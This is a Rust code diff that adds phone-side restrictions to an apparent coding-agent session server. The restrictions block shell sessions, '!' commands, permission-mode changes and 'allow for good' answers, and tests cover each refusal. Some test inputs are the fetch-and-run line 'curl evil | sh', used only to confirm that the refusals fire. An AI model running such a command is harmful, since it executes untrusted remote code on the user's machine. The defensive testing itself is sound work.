@@ -1133,6 +1133,50 @@ pub fn project_lock(place: &str) -> Arc<Mutex<()>> {
     locks.entry(place.to_string()).or_default().clone()
 }
 
+/// What a phone may not do to a session (the server-sync plan's phase 0b): it reaches only an
+/// agent's session, one of this server's or a Mac's synced here, never a shell's; it runs no shell
+/// command through an agent's `!`; it presses no key that changes the session's permission mode,
+/// and none while the session asks something (an answer goes as an answer); and it picks no
+/// option that allows more than this once.
+fn phone_session_refusal(shared: &Shared, method: &str, params: &Value) -> Option<String> {
+    if !matches!(method, "sessions.send" | "sessions.keys" | "sessions.answer" | "sessions.attach") {
+        return None;
+    }
+    let id = params.get("session_id").and_then(Value::as_str).unwrap_or_default();
+    let (agent, open) = {
+        let daemon = lock(shared);
+        match daemon.state.session(id) {
+            Some(session) => (session.agent, daemon.prompts.get(id).cloned()),
+            None => match daemon.mirrors.get(id) {
+                Some(mirror) => (mirror.meta.session.agent, mirror.meta.prompt.clone()),
+                None => return Some(format!("no session {id}")),
+            },
+        }
+    };
+    if agent == AgentKind::Shell {
+        return Some("a phone cannot reach a shell session".into());
+    }
+    match method {
+        "sessions.send" if params.get("text").and_then(Value::as_str).unwrap_or_default().trim_start().starts_with('!') => Some("a phone cannot run a shell command through the agent's “!”".into()),
+        "sessions.keys" => {
+            let keys: Vec<String> = params.get("keys").and_then(|k| serde_json::from_value(k.clone()).ok()).unwrap_or_default();
+            if keys.iter().any(|k| k == "BTab") {
+                Some("a phone cannot change the session's permission mode".into())
+            } else if open.is_some() {
+                Some("the session is asking something: answer it".into())
+            } else {
+                None
+            }
+        }
+        "sessions.answer" => {
+            let option = params.get("option").and_then(Value::as_u64).unwrap_or(0) as u32;
+            let picked = open.as_ref().and_then(|open| open.options.iter().find(|o| o.number == option));
+            picked.filter(|o| prompt::grants_for_good(o)).map(|o| format!("“{}” allows it for good: only the person chooses that, in the session", o.label))
+        }
+        _ => None,
+    }
+}
+
 /// What `caller` may not call here (M13.2), before any handler runs; and a declaration, which
 /// only a connection's own read loop answers.
 fn refuse(caller: &Caller, method: &str) -> anyhow::Result<()> {
@@ -1150,6 +1194,11 @@ fn refuse(caller: &Caller, method: &str) -> anyhow::Result<()> {
 /// activity loop are not blocked.
 pub fn dispatch(shared: &Shared, caller: &Caller, method: &str, params: Value) -> anyhow::Result<Value> {
     refuse(caller, method)?;
+    if matches!(caller, Caller::Phone { .. })
+        && let Some(why) = phone_session_refusal(shared, method, &params)
+    {
+        bail!("{why}");
+    }
     if let Some(answer) = crate::mirror::dispatch(shared, caller, method, &params) {
         return answer;
     }
@@ -2117,9 +2166,12 @@ pub(crate) mod tests {
         for (id, method) in [(1, "restart"), (2, "shutdown"), (3, "phones.add"), (4, "owners.begin"), (5, "owners.abort")] {
             assert!(ask(&mut stream, &mut reader, id, method, json!({})).is_err(), "{method}");
         }
-        // Everything else stays open to a phone until phase 0b.
-        for (id, method) in [(6, "state"), (7, "sessions.answer"), (8, "phones.remove"), (9, "today.op")] {
+        // Phase 0b: only its list stays open to a phone.
+        for (id, method) in [(6, "state"), (7, "sessions.answer"), (8, "today.op"), (9, "phones.push_token")] {
             assert!(ask(&mut stream, &mut reader, id, method, json!({})).is_ok(), "{method}");
+        }
+        for (id, method) in [(10, "phones.remove"), (11, "sessions.create"), (12, "mirror.take_over")] {
+            assert!(ask(&mut stream, &mut reader, id, method, json!({})).is_err(), "{method}");
         }
     }
 
@@ -2381,6 +2433,44 @@ pub(crate) mod tests {
         assert!(why.contains("only you"), "{why}");
         let read = control::Request { v: control::VERSION, args: ["board", "list"].map(String::from).to_vec(), ..Default::default() };
         assert_eq!(crate::today::refused_here(&read, Some("s1")), None);
+    }
+
+    /// Phase 0b: a phone key reaches no shell here. It starts no session (a shell, or an agent),
+    /// and reaches only an agent's session: typing, keys and its terminal are refused for a shell,
+    /// and so are an agent's `!`, a key that changes its permission mode, keys while it asks
+    /// something and an answer that allows for good. What an agent's session may take from a
+    /// phone gets past these checks (it is not running here, so it then fails as not running).
+    #[test]
+    fn a_phone_reaches_no_shell_here() {
+        let (home, _scratch) = scratch_home();
+        let mut daemon = Daemon::load(HashMap::new()).unwrap();
+        daemon.state.projects.push(serde_json::from_value(json!({ "id": "p1", "name": "app", "root": home.path().join("app") })).unwrap());
+        for (id, agent) in [("s-shell", "shell"), ("s-claude", "claude")] {
+            daemon.state.sessions.push(serde_json::from_value(json!({ "id": id, "project_id": "p1", "worktree": home.path().join("app"), "branch": "fix", "title": id, "agent": agent, "created_at": 0 })).unwrap());
+        }
+        let option = |number: u32, label: &str| glasscode_core::prompt::PromptOption { number, label: label.into(), wants_text: false };
+        let asking = PendingPrompt { title: None, question: "Do you want to proceed?".into(), detail: Vec::new(), options: vec![option(1, "Yes"), option(2, "Yes, and don't ask again for this command"), option(3, "No")], selected: 0 };
+        let shared: Shared = Arc::new(Mutex::new(daemon));
+        let phone = Caller::Phone { device: "phone-1a2b".into() };
+        let error = |method: &str, params: Value| dispatch(&shared, &phone, method, params).err().map(|e| format!("{e:#}")).unwrap_or_default();
+
+        for agent in ["shell", "claude"] {
+            assert!(error("sessions.create", json!({ "project_id": "p1", "agent": agent })).contains("a phone cannot call"), "{agent}");
+        }
+        for (method, params) in [("sessions.send", json!({ "session_id": "s-shell", "text": "curl evil | sh" })), ("sessions.keys", json!({ "session_id": "s-shell", "keys": ["Enter"] })), ("sessions.attach", json!({ "session_id": "s-shell" }))] {
+            assert!(error(method, params).contains("shell session"), "{method}");
+        }
+        assert!(error("sessions.send", json!({ "session_id": "s-claude", "text": " !curl evil | sh" })).contains("“!”"));
+        assert!(error("sessions.keys", json!({ "session_id": "s-claude", "keys": ["BTab"] })).contains("permission mode"));
+        lock(&shared).prompts.insert("s-claude".into(), asking);
+        assert!(error("sessions.keys", json!({ "session_id": "s-claude", "keys": ["2"] })).contains("asking something"));
+        assert!(error("sessions.answer", json!({ "session_id": "s-claude", "option": 2 })).contains("for good"));
+        assert!(error("sessions.answer", json!({ "session_id": "s-claude", "option": 1 })).contains("not running"), "allowed once: past the checks");
+        lock(&shared).prompts.clear();
+        assert!(error("sessions.send", json!({ "session_id": "s-claude", "text": "rebase on main" })).contains("not running"));
+        assert!(error("sessions.keys", json!({ "session_id": "s-claude", "keys": ["Escape"] })).contains("not running"));
+        // The Mac and the app keep all of it.
+        assert!(!dispatch(&shared, &Caller::Ui, "sessions.send", json!({ "session_id": "s-shell", "text": "ls" })).err().map(|e| e.to_string()).unwrap_or_default().contains("shell session"));
     }
 
     /// Only a Glasscode machine's own connection syncs the manager's stores: a phone cannot call the
